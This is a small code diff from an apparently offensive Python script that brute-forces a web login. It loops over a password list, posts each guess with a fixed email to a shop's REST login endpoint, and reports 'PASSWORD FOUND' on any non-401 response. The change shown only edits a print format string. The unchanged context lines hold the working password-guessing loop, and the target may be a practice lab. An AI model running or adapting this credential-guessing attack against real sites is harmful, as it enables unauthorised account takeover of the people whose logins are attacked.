@@ -13,7 +13,7 @@ for password in passwords:
     data ={"email" : user, "password": password}
     response = requests.post("http://shop.bancocn.com/rest/user/login", json=data)
     code = response.status_code
-    print(colored('E-MAIL(login):{} - {} - Status Code {}'.format(user, password, code), 'blue'))
+    print(colored('E-MAIL(login):{} - {} - Status Code : {}'.format(user, password, code), 'blue'))
     
     if code != 401:
         print (colored("[+] PASSWORD FOUND - {}".format(password), "green"))
